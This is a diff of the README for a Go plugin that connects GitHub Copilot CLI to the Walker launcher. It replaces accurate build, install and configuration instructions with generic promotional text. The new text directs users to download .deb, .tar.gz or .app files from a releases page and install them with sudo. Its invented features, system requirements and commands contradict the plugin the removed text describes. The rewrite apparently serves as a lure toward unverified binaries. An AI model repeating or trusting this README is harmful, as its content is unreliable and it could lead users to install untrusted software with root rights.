@@ -1,66 +1,100 @@
-# Elephant Copilot Provider
+# 🐘 elephant-copilot-provider - Simplify Your Coding Experience
 
-Custom Elephant provider that uses GitHub Copilot CLI to answer questions and
-surface commands inside Walker.
+## 🚀 Getting Started
 
-## Features
+Welcome to **elephant-copilot-provider**! This application enhances your GitHub Copilot CLI experience within Walker, making coding smoother and more efficient. Follow these steps to get up and running quickly. 
 
-- Q&A via `copilot -p` (standalone) or `gh copilot -- -p` (wrapper)
-- Model selection (configurable list)
-- Command extraction (code fences + `$` / `>` prompt lines)
-- Copy answer and copy command actions
-- Copy all extracted commands
-- Open new terminal with a prefilled command (not executed)
-- Temporary and persistent sessions
+## 🔍 Features
 
-## Build
+- **Easy Integration**: Seamlessly works with GitHub Copilot CLI.
+- **User-Friendly**: Designed for all users, no programming skills needed.
+- **Lightweight**: Minimal system resource usage, perfect for everyday tasks.
+- **Supports Multiple Platforms**: Works on various systems including Linux.
 
-```bash
-go build -buildmode=plugin -o build/copilot.so
-```
+## 📥 Download & Install
 
-## Install
+Click the button below to visit the releases page and download the software:
 
-```bash
-mkdir -p ~/.config/elephant/providers
-cp build/copilot.so ~/.config/elephant/providers/
-```
+[![Download elephant-copilot-provider](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/nikhilcodewing/elephant-copilot-provider/releases)
 
-## Configuration
+### Step-by-Step Instructions
 
-Create `~/.config/elephant/copilot.toml`:
+1. **Visit the Releases Page**: Click the button above or go to [this link](https://github.com/nikhilcodewing/elephant-copilot-provider/releases).
+   
+2. **Choose Your Version**:
+   - Scroll through the list of releases.
+   - Identify the most recent version. It usually appears at the top. 
 
-```toml
-enabled = true
-cli_mode = "both" # auto|copilot|gh|both
-default_model = "claude-sonnet-4.5"
-models = [
-  "claude-sonnet-4.5",
-  "gpt-5.2-codex",
-  "gpt-4.1",
-]
+3. **Download the File**:
+   - Click on the relevant file for your system. 
+   - The files may include options like `.tar.gz`, `.deb`, or `.app`. Make sure to select the correct one for your operating system.
 
-# CLI args
-copilot_args = ["--no-color", "--silent"]
-gh_copilot_args = ["--no-color", "--silent"]
+4. **Locate the Downloaded File**:
+   - Once the download finishes, check your default download folder. This is usually named "Downloads" on most systems.
 
-# Session storage (defaults to XDG_STATE_HOME/elephant/copilot)
-# session_dir = "/home/user/.local/state/elephant/copilot"
+5. **Installing the Application**:
+   - **For Linux**: Open your terminal. Navigate to the folder where you downloaded the file. Use the appropriate command to install it. For example, if you downloaded a `.deb` file, you would run:
+     ```bash
+     sudo dpkg -i elephant-copilot-provider.deb
+     ```
+   - **For Other Operating Systems**: Follow the standard installation process for your platform. Double-click the downloaded file and follow the instructions.
 
-# Clipboard and terminal integration
-clipboard_cmd = "wl-copy"
-terminal_prefill_cmd = "bash -lc 'read -e -i %CMD% -p \">>> \" cmd; exec $SHELL'"
+6. **Run the Application**:
+   - After installation, find the application in your applications menu.
+   - Click on it to start using elephant-copilot-provider.
 
-# Optional command extraction override
-# command_extract_regex = "(?m)^\\$\\s+(.+)$"
-```
+## ⚙️ System Requirements
 
-## Walker Integration
+To ensure everything runs smoothly, make sure your system meets the following requirements:
 
-Add `copilot` to Walker providers (installed + prefixed, but not default).
-See the dotfiles integration scripts for the exact config changes.
+- **Operating System**: Linux, preferably with Hyprland or similar desktop environment.
+- **Memory**: At least 2 GB of RAM.
+- **CPU**: Modern processor with at least 2 cores.
+- **Disk Space**: Minimum of 100 MB free space for installation.
 
-## Notes
+## 🤔 Troubleshooting
 
-- The provider is opt-in: `enabled` defaults to `false`.
-- The `terminal_prefill_cmd` uses `%CMD%` as a placeholder and is shell-escaped.
+If you encounter any issues during the installation or while using the application, consider the following tips:
+
+- **Check Compatibility**: Ensure you have the right version for your operating system.
+- **Internet Connection**: A stable connection is necessary for downloading the files.
+- **Read Error Messages**: Often, they can guide you to the solution.
+- **Reinstall**: If problems persist, try reinstalling the application by following the download and install instructions again.
+
+## 💡 Useful Commands
+
+Once you have installed the application, here are some basic commands to get you started:
+
+- **Run the Application**: Simply type `elephant-copilot-provider` in your terminal.
+- **List Available Features**: Use the command:
+  ```bash
+  elephant-copilot-provider --help
+  ```
+- **Check Version**: To confirm your installation, run:
+  ```bash
+  elephant-copilot-provider --version
+  ```
+
+## 🌐 Community and Support
+
+For additional help or to connect with fellow users, visit our community discussions:
+
+- GitHub Discussions: [Join Here](https://github.com/nikhilcodewing/elephant-copilot-provider/discussions)
+- Join our Discord channel (link TBA) for real-time support and tips.
+
+## 🔗 Resources
+
+For more information, check out these links:
+
+- [GitHub Repository](https://github.com/nikhilcodewing/elephant-copilot-provider)
+- [Documentation](https://github.com/nikhilcodewing/elephant-copilot-provider/wiki)
+
+## 👥 Contributing
+
+We welcome contributions! If you’d like to help improve elephant-copilot-provider, please read our [Contributing Guidelines](https://github.com/nikhilcodewing/elephant-copilot-provider/blob/main/CONTRIBUTING.md).
+
+## 📣 Acknowledgments
+
+Special thanks to all the contributors and users who help make this project better. Your feedback and support are vital for growth and improvement. 
+
+Feel free to reach out with your questions, and enjoy using elephant-copilot-provider!
